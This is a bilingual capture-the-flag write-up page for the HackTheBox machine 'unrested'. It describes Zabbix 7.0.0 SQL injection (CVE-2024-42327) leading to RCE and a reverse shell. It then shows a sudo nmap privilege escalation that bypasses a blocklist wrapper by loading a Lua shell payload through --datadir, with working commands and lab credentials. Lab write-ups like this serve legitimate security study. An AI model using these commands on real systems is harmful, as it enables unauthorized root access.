@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>unrested | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">unrested</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The machine simulated a real-world pentest scenario by providing initial credentials for a Zabbix account (<code>matthew:96qzn0h2e1k3</code>). The target was running Zabbix version 7.0.0, which is vulnerable to CVE-2024-42327, a SQL injection vulnerability in the <code>/api_jsonrpc.php</code> endpoint.</p>
+                    
+                    <p>By exploiting this SQL injection, I was able to extract the admin session token and leverage it to achieve remote code execution through Zabbix's command execution functionality. This granted initial access as the <code>zabbix</code> user.</p>
+                    
+                    <p>Privilege escalation was achieved by exploiting a <code>sudo</code> misconfiguration that allowed the <code>zabbix</code> user to run <code>nmap</code> with elevated privileges. Although several dangerous nmap options were disabled through a wrapper script, the <code>--datadir</code> option was left unrestricted. By creating a malicious <code>nse_main.lua</code> file in a controlled directory and using <code>--datadir</code> to point nmap to it, I was able to execute arbitrary Lua code as root, spawning a root shell.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Zabbix 7.0.0 SQL injection (CVE-2024-42327) leading to RCE, nmap privilege escalation via custom NSE script execution, Lua code injection.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Information</h2>
+                <p>As is common in real-life pentests, this machine starts with provided credentials for a Zabbix account:</p>
+                <pre><code class="language-plaintext">Username: matthew
+Password: 96qzn0h2e1k3</code></pre>
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services:</p>
+                <p><img src="./media/image2.png" alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 80" /></p>
+
+                <p>The scan reveals port 80 is running an HTTP service, which hosts a Zabbix instance.</p>
+
+                <h2>Web Enumeration - Zabbix Dashboard</h2>
+                <p>Navigating to port 80, I find the Zabbix monitoring platform:</p>
+                <p><img src="./media/image1.png" alt="Zabbix login page showing version information" /></p>
+
+                <p>I can identify the exact version running by checking the footer and the system information panel: <strong>Zabbix 7.0.0</strong>. This is a relatively recent version, but checking CVE databases reveals it has several critical vulnerabilities.</p>
+
+                <h2>Vulnerability Research - CVE-2024-42327</h2>
+                <p>Searching for known vulnerabilities affecting Zabbix 7.0.0, I find multiple security issues listed at <a href="https://www.cvedetails.com/version/1770265/Zabbix-Zabbix-7.0.0.html">CVE Details</a>.</p>
+
+                <p>One particularly interesting vulnerability is a SQL injection flaw (CVE-2024-42327) that affects the <code>/api_jsonrpc.php</code> endpoint. I locate a proof-of-concept exploit at <a href="https://www.exploit-db.com/exploits/52230">Exploit-DB</a> that demonstrates the SQL injection.</p>
+
+                <h3>From SQL Injection to RCE</h3>
+                <p>Rather than manually exploiting the SQL injection with <code>sqlmap</code>, I search for an exploit that can leverage the SQLi to achieve remote code execution. I find a comprehensive PoC at <a href="https://github.com/BridgerAlderson/Zabbix-CVE-2024-42327-SQL-Injection-RCE">GitHub</a>.</p>
+
+                <p>This exploit works by:</p>
+                <ol>
+                    <li>Exploiting the SQL injection to extract the admin session token from the database</li>
+                    <li>Using the stolen session token to authenticate to Zabbix as an administrator</li>
+                    <li>Leveraging Zabbix's built-in command execution functionality to run arbitrary commands</li>
+                    <li>Executing a reverse shell payload to gain interactive access</li>
+                </ol>
+
+                <h2>Initial Access - Exploiting Zabbix SQLi</h2>
+                <p>First, I set up a netcat listener on port 443 to catch the reverse shell:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Then I execute the exploit against the target:</p>
+                <p><img src="./media/image4.png" alt="Exploit execution showing successful SQL injection and command execution through Zabbix" /></p>
+
+                <p>The exploit successfully extracts the admin session token through the SQL injection, authenticates to Zabbix, and executes a bash reverse shell command. My netcat listener receives the connection, granting me shell access as the <code>zabbix</code> user.</p>
+
+                <h3>Initial Enumeration</h3>
+                <p>After gaining access, I perform some basic enumeration:</p>
+
+                <ul>
+                    <li>In <code>/home</code> I find the user <code>matthew</code>, but credential reuse doesn't work with the Zabbix credentials</li>
+                    <li>Running <code>ss -tuln</code> reveals MySQL is running locally on the machine</li>
+                    <li>In <code>/etc/zabbix</code> I find Zabbix configuration files, including <code>zabbix.conf.php</code>, but it's only readable by <code>www-data</code> and <code>root</code></li>
+                </ul>
+
+                <p>Interestingly, I have read access to Matthew's home directory and can retrieve the user flag, though there's nothing else of interest there.</p>
+
+                <h2>Privilege Escalation - Nmap Sudo Misconfiguration</h2>
+                <p>Checking sudo privileges for the <code>zabbix</code> user reveals an interesting configuration:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>Output:</p>
+                <pre><code class="language-plaintext">Matching Defaults entries for zabbix on unrested:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User zabbix may run the following commands on unrested:
+    (ALL : ALL) NOPASSWD: /usr/bin/nmap *</code></pre>
+
+                <p>The <code>zabbix</code> user can run <code>nmap</code> with any arguments as root without a password. This is a well-known privilege escalation vector.</p>
+
+                <h3>Attempted GTFOBins Techniques</h3>
+                <p>Consulting <a href="https://gtfobins.github.io/gtfobins/nmap/#sudo">GTFOBins</a>, I find two common methods to escalate privileges with sudo nmap access:</p>
+
+                <ol>
+                    <li>Using <code>--interactive</code> mode to spawn a shell</li>
+                    <li>Using <code>--script</code> to execute NSE scripts that spawn shells</li>
+                </ol>
+
+                <p>However, both methods are blocked:</p>
+                <pre><code class="language-bash">sudo nmap --interactive</code></pre>
+                <pre><code class="language-plaintext">Interactive mode is disabled for security reasons.</code></pre>
+
+                <pre><code class="language-bash">sudo nmap --script=test</code></pre>
+                <pre><code class="language-plaintext">Script mode is disabled for security reasons.</code></pre>
+
+                <h3>Investigating the Nmap Wrapper</h3>
+                <p>The error messages don't appear to be native nmap output, which suggests the binary has been modified. Examining <code>/usr/bin/nmap</code> confirms this suspicion:</p>
+                <pre><code class="language-bash">#!/bin/bash
+
+## Restrictive nmap for Zabbix ##
+
+# List of restricted options and corresponding error messages
+declare -A RESTRICTED_OPTIONS=(
+    ["--interactive"]="Interactive mode is disabled for security reasons."
+    ["--script"]="Script mode is disabled for security reasons."
+    ["-oG"]="Scan outputs in Greppable format are disabled for security reasons."
+    ["-iL"]="File input mode is disabled for security reasons."
+)
+
+# Check if any restricted options are used
+for option in "${!RESTRICTED_OPTIONS[@]}"; do
+    if [[ "$*" == *"$option"* ]]; then
+        echo "${RESTRICTED_OPTIONS[$option]}"
+        exit 1
+    fi
+done
+
+exec /usr/bin/nmap.original "$@"</code></pre>
+
+                <p>The nmap binary is actually a bash wrapper script that filters out dangerous options before passing arguments to the real nmap binary (<code>/usr/bin/nmap.original</code>).</p>
+
+                <h3>Finding the Bypass - Custom Data Directory</h3>
+                <p>While several dangerous options are blocked, I research alternative nmap features that might allow code execution. I discover the <code>--datadir</code> option in the <a href="https://nmap.org/book/man-briefoptions.html">nmap documentation</a>:</p>
+
+                <blockquote>
+                    <p><code>--datadir &lt;dirname&gt;</code>: Specify custom Nmap data file location</p>
+                </blockquote>
+
+                <p>This option allows specifying a custom directory for nmap's data files. By default, nmap stores its scripts in <code>/usr/share/nmap/scripts/</code> and loads the main NSE engine from <code>/usr/share/nmap/nse_main.lua</code>.</p>
+
+                <p>Checking the default nmap data directory structure:</p>
+                <pre><code class="language-bash">ls -la /usr/share/nmap</code></pre>
+                <pre><code class="language-plaintext">total 9192
+drwxr-xr-x   4 root root    4096 Dec  1  2024 .
+drwxr-xr-x 126 root root    4096 Dec  3  2024 ..
+-rw-r--r--   1 root root   10556 Jan 12  2023 nmap.dtd
+-rw-r--r--   1 root root  717314 Jan 12  2023 nmap-mac-prefixes
+-rw-r--r--   1 root root 5002931 Jan 12  2023 nmap-os-db
+-rw-r--r--   1 root root   14579 Jan 12  2023 nmap-payloads
+-rw-r--r--   1 root root    6703 Jan 12  2023 nmap-protocols
+-rw-r--r--   1 root root   49647 Jan 12  2023 nmap-rpc
+-rw-r--r--   1 root root 2461461 Jan 12  2023 nmap-service-probes
+-rw-r--r--   1 root root 1000134 Jan 12  2023 nmap-services
+-rw-r--r--   1 root root   31936 Jan 12  2023 nmap.xsl
+drwxr-xr-x   3 root root    4096 Dec  1  2024 nselib
+-rw-r--r--   1 root root   48404 Jan 12  2023 nse_main.lua
+drwxr-xr-x   2 root root   36864 Dec  1  2024 scripts</code></pre>
+
+                <p>The key file is <code>nse_main.lua</code>, which is the main Lua script that nmap's NSE (Nmap Scripting Engine) executes when running with the <code>-sC</code> option (default scripts).</p>
+
+                <h3>Exploiting NSE with Custom Lua Code</h3>
+                <p>The attack strategy is to:</p>
+                <ol>
+                    <li>Create a malicious <code>nse_main.lua</code> file in a writable directory (like <code>/tmp</code>)</li>
+                    <li>Use <code>--datadir</code> to point nmap to this directory</li>
+                    <li>Run nmap with <code>-sC</code> to trigger execution of the custom Lua file</li>
+                    <li>The Lua code will spawn a root shell</li>
+                </ol>
+
+                <p>Creating the malicious Lua script in <code>/tmp</code>:</p>
+                <pre><code class="language-bash">echo 'os.execute("/bin/bash");' > /tmp/nse_main.lua</code></pre>
+
+                <p>This simple Lua script uses the <code>os.execute()</code> function to spawn a bash shell. When nmap runs this as root (via sudo), it will spawn a root shell.</p>
+
+                <p>Executing the privilege escalation:</p>
+                <pre><code class="language-bash">sudo nmap --datadir=/tmp -sC localhost</code></pre>
+
+                <p>Output:</p>
+                <pre><code class="language-plaintext">Starting Nmap 7.80 ( https://nmap.org )
+Warning: File ./nmap-services exists, but Nmap is using /usr/bin/../share/nmap/nmap-services for security and consistency reasons. set NMAPDIR=. to give priority to files in your local directory (may affect the other data files too).
+root@unrested:/var/lib/zabbix/xd#</code></pre>
+
+                <p>The command successfully executes, and I receive a root shell. The warning message can be ignored - it's just nmap informing that it's using some files from the original data directory while using others from <code>/tmp</code>.</p>
+
+                <p>Verifying root access:</p>
+                <pre><code class="language-bash">whoami</code></pre>
+                <pre><code class="language-plaintext">root</code></pre>
+
+                <p>Now I can retrieve the root flag and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina simulaba un escenario de pentest del mundo real proporcionando credenciales iniciales para una cuenta de Zabbix (<code>matthew:96qzn0h2e1k3</code>). El objetivo ejecutaba Zabbix versión 7.0.0, vulnerable a CVE-2024-42327, una vulnerabilidad de inyección SQL en el endpoint <code>/api_jsonrpc.php</code>.</p>
+                    
+                    <p>Explotando esta inyección SQL, pude extraer el token de sesión del administrador y aprovecharlo para conseguir ejecución remota de código mediante la funcionalidad de ejecución de comandos de Zabbix. Esto otorgó acceso inicial como usuario <code>zabbix</code>.</p>
+                    
+                    <p>La escalada de privilegios se logró explotando una mala configuración de <code>sudo</code> que permitía al usuario <code>zabbix</code> ejecutar <code>nmap</code> con privilegios elevados. Aunque varias opciones peligrosas de nmap estaban deshabilitadas mediante un script wrapper, la opción <code>--datadir</code> quedó sin restricciones. Creando un archivo malicioso <code>nse_main.lua</code> en un directorio controlado y usando <code>--datadir</code> para apuntar nmap a él, pude ejecutar código Lua arbitrario como root, generando una shell de root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Inyección SQL en Zabbix 7.0.0 (CVE-2024-42327) llevando a RCE, escalada de privilegios con nmap mediante ejecución de script NSE personalizado, inyección de código Lua.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Información Inicial</h2>
+                <p>Como es común en pentests de la vida real, esta máquina comienza con credenciales proporcionadas para una cuenta de Zabbix:</p>
+                <pre><code class="language-plaintext">Usuario: matthew
+Contraseña: 96qzn0h2e1k3</code></pre>
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios:</p>
+                <p><img src="./media/image2.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 80" /></p>
+
+                <p>El escaneo revela que el puerto 80 ejecuta un servicio HTTP, que aloja una instancia de Zabbix.</p>
+
+                <h2>Enumeración Web - Panel de Zabbix</h2>
+                <p>Navegando al puerto 80, encuentro la plataforma de monitorización Zabbix:</p>
+                <p><img src="./media/image1.png" alt="Página de inicio de sesión de Zabbix mostrando información de versión" /></p>
+
+                <p>Puedo identificar la versión exacta en ejecución consultando el pie de página y el panel de información del sistema: <strong>Zabbix 7.0.0</strong>. Esta es una versión relativamente reciente, pero al consultar las bases de datos de CVE se revela que tiene varias vulnerabilidades críticas.</p>
+
+                <h2>Investigación de Vulnerabilidades - CVE-2024-42327</h2>
+                <p>Buscando vulnerabilidades conocidas que afecten a Zabbix 7.0.0, encuentro múltiples problemas de seguridad listados en <a href="https://www.cvedetails.com/version/1770265/Zabbix-Zabbix-7.0.0.html">CVE Details</a>.</p>
+
+                <p>Una vulnerabilidad particularmente interesante es un fallo de inyección SQL (CVE-2024-42327) que afecta al endpoint <code>/api_jsonrpc.php</code>. Localizo una prueba de concepto del exploit en <a href="https://www.exploit-db.com/exploits/52230">Exploit-DB</a> que demuestra la inyección SQL.</p>
+
+                <h3>De Inyección SQL a RCE</h3>
+                <p>En lugar de explotar manualmente la inyección SQL con <code>sqlmap</code>, busco un exploit que pueda aprovechar el SQLi para conseguir ejecución remota de código. Encuentro una PoC completa en <a href="https://github.com/BridgerAlderson/Zabbix-CVE-2024-42327-SQL-Injection-RCE">GitHub</a>.</p>
+
+                <p>Este exploit funciona mediante:</p>
+                <ol>
+                    <li>Explotar la inyección SQL para extraer el token de sesión del administrador de la base de datos</li>
+                    <li>Usar el token de sesión robado para autenticarse en Zabbix como administrador</li>
+                    <li>Aprovechar la funcionalidad integrada de ejecución de comandos de Zabbix para ejecutar comandos arbitrarios</li>
+                    <li>Ejecutar un payload de reverse shell para obtener acceso interactivo</li>
+                </ol>
+
+                <h2>Acceso Inicial - Explotando SQLi en Zabbix</h2>
+                <p>Primero, configuro un listener de netcat en el puerto 443 para capturar la reverse shell:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Luego ejecuto el exploit contra el objetivo:</p>
+                <p><img src="./media/image4.png" alt="Ejecución del exploit mostrando inyección SQL exitosa y ejecución de comandos a través de Zabbix" /></p>
+
+                <p>El exploit extrae exitosamente el token de sesión del administrador mediante la inyección SQL, se autentica en Zabbix y ejecuta un comando de reverse shell en bash. Mi listener de netcat recibe la conexión, otorgándome acceso shell como usuario <code>zabbix</code>.</p>
+
+                <h3>Enumeración Inicial</h3>
+                <p>Tras obtener acceso, realizo algo de enumeración básica:</p>
+
+                <ul>
+                    <li>En <code>/home</code> encuentro al usuario <code>matthew</code>, pero el reuso de credenciales no funciona con las credenciales de Zabbix</li>
+                    <li>Ejecutar <code>ss -tuln</code> revela que MySQL está corriendo localmente en la máquina</li>
+                    <li>En <code>/etc/zabbix</code> encuentro archivos de configuración de Zabbix, incluyendo <code>zabbix.conf.php</code>, pero sólo es legible por <code>www-data</code> y <code>root</code></li>
+                </ul>
+
+                <p>Curiosamente, tengo acceso de lectura al directorio home de Matthew y puedo recuperar la flag de usuario, aunque no hay nada más de interés allí.</p>
+
+                <h2>Escalada de Privilegios - Mala Configuración de Sudo en Nmap</h2>
+                <p>Comprobando los privilegios sudo para el usuario <code>zabbix</code> revela una configuración interesante:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>Salida:</p>
+                <pre><code class="language-plaintext">Matching Defaults entries for zabbix on unrested:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User zabbix may run the following commands on unrested:
+    (ALL : ALL) NOPASSWD: /usr/bin/nmap *</code></pre>
+
+                <p>El usuario <code>zabbix</code> puede ejecutar <code>nmap</code> con cualquier argumento como root sin contraseña. Este es un vector de escalada de privilegios bien conocido.</p>
+
+                <h3>Técnicas Intentadas de GTFOBins</h3>
+                <p>Consultando <a href="https://gtfobins.github.io/gtfobins/nmap/#sudo">GTFOBins</a>, encuentro dos métodos comunes para escalar privilegios con acceso sudo a nmap:</p>
+
+                <ol>
+                    <li>Usar el modo <code>--interactive</code> para generar una shell</li>
+                    <li>Usar <code>--script</code> para ejecutar scripts NSE que generen shells</li>
+                </ol>
+
+                <p>Sin embargo, ambos métodos están bloqueados:</p>
+                <pre><code class="language-bash">sudo nmap --interactive</code></pre>
+                <pre><code class="language-plaintext">Interactive mode is disabled for security reasons.</code></pre>
+
+                <pre><code class="language-bash">sudo nmap --script=test</code></pre>
+                <pre><code class="language-plaintext">Script mode is disabled for security reasons.</code></pre>
+
+                <h3>Investigando el Wrapper de Nmap</h3>
+                <p>Los mensajes de error no parecen ser salida nativa de nmap, lo que sugiere que el binario ha sido modificado. Examinar <code>/usr/bin/nmap</code> confirma esta sospecha:</p>
+                <pre><code class="language-bash">#!/bin/bash
+
+## Restrictive nmap for Zabbix ##
+
+# List of restricted options and corresponding error messages
+declare -A RESTRICTED_OPTIONS=(
+    ["--interactive"]="Interactive mode is disabled for security reasons."
+    ["--script"]="Script mode is disabled for security reasons."
+    ["-oG"]="Scan outputs in Greppable format are disabled for security reasons."
+    ["-iL"]="File input mode is disabled for security reasons."
+)
+
+# Check if any restricted options are used
+for option in "${!RESTRICTED_OPTIONS[@]}"; do
+    if [[ "$*" == *"$option"* ]]; then
+        echo "${RESTRICTED_OPTIONS[$option]}"
+        exit 1
+    fi
+done
+
+exec /usr/bin/nmap.original "$@"</code></pre>
+
+                <p>El binario nmap es en realidad un script wrapper de bash que filtra opciones peligrosas antes de pasar los argumentos al binario real de nmap (<code>/usr/bin/nmap.original</code>).</p>
+
+                <h3>Encontrando el Bypass - Directorio de Datos Personalizado</h3>
+                <p>Aunque varias opciones peligrosas están bloqueadas, investigo características alternativas de nmap que puedan permitir ejecución de código. Descubro la opción <code>--datadir</code> en la <a href="https://nmap.org/book/man-briefoptions.html">documentación de nmap</a>:</p>
+
+                <blockquote>
+                    <p><code>--datadir &lt;dirname&gt;</code>: Especificar localización personalizada del archivo de datos de Nmap</p>
+                </blockquote>
+
+                <p>Esta opción permite especificar un directorio personalizado para los archivos de datos de nmap. Por defecto, nmap almacena sus scripts en <code>/usr/share/nmap/scripts/</code> y carga el motor principal NSE desde <code>/usr/share/nmap/nse_main.lua</code>.</p>
+
+                <p>Comprobando la estructura del directorio de datos predeterminado de nmap:</p>
+                <pre><code class="language-bash">ls -la /usr/share/nmap</code></pre>
+                <pre><code class="language-plaintext">total 9192
+drwxr-xr-x   4 root root    4096 Dec  1  2024 .
+drwxr-xr-x 126 root root    4096 Dec  3  2024 ..
+-rw-r--r--   1 root root   10556 Jan 12  2023 nmap.dtd
+-rw-r--r--   1 root root  717314 Jan 12  2023 nmap-mac-prefixes
+-rw-r--r--   1 root root 5002931 Jan 12  2023 nmap-os-db
+-rw-r--r--   1 root root   14579 Jan 12  2023 nmap-payloads
+-rw-r--r--   1 root root    6703 Jan 12  2023 nmap-protocols
+-rw-r--r--   1 root root   49647 Jan 12  2023 nmap-rpc
+-rw-r--r--   1 root root 2461461 Jan 12  2023 nmap-service-probes
+-rw-r--r--   1 root root 1000134 Jan 12  2023 nmap-services
+-rw-r--r--   1 root root   31936 Jan 12  2023 nmap.xsl
+drwxr-xr-x   3 root root    4096 Dec  1  2024 nselib
+-rw-r--r--   1 root root   48404 Jan 12  2023 nse_main.lua
+drwxr-xr-x   2 root root   36864 Dec  1  2024 scripts</code></pre>
+
+                <p>El archivo clave es <code>nse_main.lua</code>, que es el script principal de Lua que el NSE (Nmap Scripting Engine) de nmap ejecuta al correr con la opción <code>-sC</code> (scripts predeterminados).</p>
+
+                <h3>Explotando NSE con Código Lua Personalizado</h3>
+                <p>La estrategia de ataque consiste en:</p>
+                <ol>
+                    <li>Crear un archivo malicioso <code>nse_main.lua</code> en un directorio escribible (como <code>/tmp</code>)</li>
+                    <li>Usar <code>--datadir</code> para apuntar nmap a este directorio</li>
+                    <li>Ejecutar nmap con <code>-sC</code> para desencadenar la ejecución del archivo Lua personalizado</li>
+                    <li>El código Lua generará una shell de root</li>
+                </ol>
+
+                <p>Creando el script Lua malicioso en <code>/tmp</code>:</p>
+                <pre><code class="language-bash">echo 'os.execute("/bin/bash");' > /tmp/nse_main.lua</code></pre>
+
+                <p>Este sencillo script Lua usa la función <code>os.execute()</code> para generar una shell de bash. Cuando nmap ejecute esto como root (mediante sudo), generará una shell de root.</p>
+
+                <p>Ejecutando la escalada de privilegios:</p>
+                <pre><code class="language-bash">sudo nmap --datadir=/tmp -sC localhost</code></pre>
+
+                <p>Salida:</p>
+                <pre><code class="language-plaintext">Starting Nmap 7.80 ( https://nmap.org )
+Warning: File ./nmap-services exists, but Nmap is using /usr/bin/../share/nmap/nmap-services for security and consistency reasons. set NMAPDIR=. to give priority to files in your local directory (may affect the other data files too).
+root@unrested:/var/lib/zabbix/xd#</code></pre>
+
+                <p>El comando se ejecuta exitosamente y recibo una shell de root. El mensaje de advertencia puede ignorarse - sólo es nmap informando que está usando algunos archivos del directorio de datos original mientras usa otros de <code>/tmp</code>.</p>
+
+                <p>Verificando el acceso root:</p>
+                <pre><code class="language-bash">whoami</code></pre>
+                <pre><code class="language-plaintext">root</code></pre>
+
+                <p>Ahora puedo recuperar la flag de root y completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
